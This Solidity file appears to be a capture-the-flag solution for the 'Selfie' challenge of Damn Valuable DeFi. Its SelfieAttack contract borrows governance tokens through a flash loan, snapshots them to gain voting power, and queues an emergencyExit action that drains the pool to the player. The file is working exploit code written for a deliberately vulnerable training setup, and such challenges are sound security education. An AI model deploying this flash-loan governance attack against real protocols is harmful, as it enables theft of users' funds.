// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack is IERC3156FlashBorrower {
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    address public player;
    uint256 public amount = 1500000 ether;

    constructor(
        address poolAddress,
        address governanceAddress,
        address tokenAddress,
        address playerAddress
    ) {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
        player = playerAddress;
    }

    function getLoan() public {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            player
        );
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            amount,
            data
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        require(token.balanceOf(address(this)) == amount, "Flash loan failed");
        uint256 id = token.snapshot();
        require(id == 2, "didn't create snapshot");
        governance.queueAction(address(pool), 0, data);
        uint count = governance.getActionCounter();
        require(count == 2, "didn't queue action");
        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() public {
        governance.executeAction(1);
    }
}
